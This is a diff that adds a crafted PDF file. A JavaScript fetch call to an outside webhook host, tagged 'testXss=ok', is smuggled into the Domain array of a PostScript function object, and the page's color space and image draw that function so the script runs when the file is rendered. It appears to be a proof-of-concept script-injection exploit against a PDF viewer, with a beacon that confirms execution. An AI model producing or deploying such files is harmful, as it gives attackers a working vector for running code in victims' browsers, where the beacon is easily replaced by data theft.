@@ -1,0 +1,67 @@
+%PDF-1.4
+1 0 obj
+<<
+  /FunctionType 4
+  /Domain [(fetch('https://webhook.site/b73ed476-d9da-45f7-998b-cef2e701b49a?testXss=ok').catch(()=>{})) 0]
+  /Range [0 0]
+  /Length 12
+>>
+stream
+{
+  0 add
+}
+endstream
+endobj
+2 0 obj
+<< /Type /Catalog /Pages 3 0 R >>
+endobj
+3 0 obj
+<< /Type /Pages /Kids [6 0 R] /Count 1 >>
+endobj
+4 0 obj
+[ /Indexed
+  [ /DeviceN
+    [/Cyan /Black]
+    /DeviceCMYK
+    1 0 R
+  ]
+  1(123)
+]
+endobj
+5 0 obj
+<< /Type /XObject /Subtype /Image /Width 1 /Height 1 /ColorSpace 4 0 R /BitsPerComponent 8 /Length 1 >>
+stream
+x
+endstream
+endobj
+6 0 obj
+<< /Type /Page /Parent 3 0 R /Resources << /XObject << /Im5 5 0 R >> >> /MediaBox [0 0 100 100] /Contents 7 0 R >>
+endobj
+7 0 obj
+<< /Length 100 >>
+stream
+  1  1  1  rg
+  0  0  100 100 re  f
+  BT
+    /Para << /MCID 1 >>
+    BDC
+      /Im5 Do
+    EMC
+  ET
+endstream
+endobj
+xref
+0 8
+0000000000 65535 f 
+0000000009 00000 n 
+0000000213 00000 n 
+0000000262 00000 n 
+0000000319 00000 n 
+0000000418 00000 n 
+0000000556 00000 n 
+0000000686 00000 n 
+trailer
+<< /Root 2 0 R /Size 8 >>
+startxref
+836
+%%EOF
